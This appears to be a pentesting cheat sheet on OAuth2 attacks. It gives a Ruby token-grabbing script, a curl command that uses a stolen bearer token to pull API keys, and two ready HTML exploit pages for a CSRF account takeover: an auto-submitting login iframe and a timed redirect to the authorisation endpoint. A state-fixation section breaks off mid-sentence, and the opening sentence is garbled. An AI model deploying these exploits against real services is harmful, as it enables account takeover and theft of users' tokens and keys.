# OAuth2

## Open Redirect

When authorising with OAuth, then the redirect parameters for open redirects.  
This can be used to steal session codes from victims.  

## Get Access Tokens with Ruby

If you can create a resource, this script can be used with XSS or CSRF to steal sessions:  
Script from Louis at Pentesterlab  

```ruby
require 'oauth2'

callback = "[CALLBACK_URL]"
app_id = "[APPLICATION_ID]"

secret = "[SECRET]"
client = OAuth2::Client.new(app_id, secret, site: "[AUTHORIZATION_SERVER]")
client.auth_code.authorize_url(redirect_uri: callback)

code="[CODE]"
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token 
```

Feed the token returned from above into this command:  

```bash
curl -H 'Authorization: Bearer [TOKEN]' [RESOURCE_SERVER]/api/keys --dump-header -
```

## CSRF to Access Another User's Account

1. Start by creating a malicious account on the `authorisation server` and the `OAuth2 Client`
2. Line these two accounts and then unlink them
3. Check that the process of signing in and authorising does not require CSRF tokens
4. Create an HTML page to be loaded inside an iframe. Copy the form found in the source of the target page

```html
<!-- frame.html -->
<html>
        <body onload="document.getElementById('csrf').submit()">
<form class="new_user" id="csrf" action="http://target.com/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="xwlEm/OXisbDKOWdxJIFZCX7C/OGvl00RiJQehGA9pgAMqxgMS3QlF4kfbtrkAR1NGH0X+cY0OEdkGRm5X0iXw==">
  <div class="field">
    <label for="user_email">Email</label><br>
    <input autofocus="autofocus" autocomplete="email" type="email" value="test2@example.com" name="user[email]" id="user_email">
  </div>

  <div class="field">
    <label for="user_password">Password</label><br>
    <input autocomplete="current-password" type="password" value="password" name="user[password]" id="user_password">
  </div>

    <div class="field">
      <input name="user[remember_me]" type="hidden" value="0"><input type="checkbox" value="1" name="user[remember_me]" id="user_remember_me">
      <label for="user_remember_me">Remember me</label>
    </div>

  <div class="actions">
    <input type="submit" name="commit" value="Log in" data-disable-with="Log in">
  </div>
</form>
</body>
</html>
```

5. Create an HTML page that will load your iframe and then open the authorisation page after a timeout

```html
<!-- exploit.html -->
<html>
        <body>
                <iframe src="frame.html"></iframe>
        <script>
                setTimeout(function() {window.location="http://target.com/users/auth/myprovider"}, 500);
        </script>
        </body>
</html>

```

## State Fixation with CSRF

Exploiting an OAuth2 Client that is vulnerbale to state fixation and CSRF in the link functionality.  

Create an HTML page that will:  
- Prime the victim's session with a state
- Pass a valid code with the fixated state

Create a malicious account that will be used for the link, begin the OAuth2 dance but intercept requests and stop before the final redirect with the valid code.  
Look through the request history for a request that primes the session with a state, e.g. 
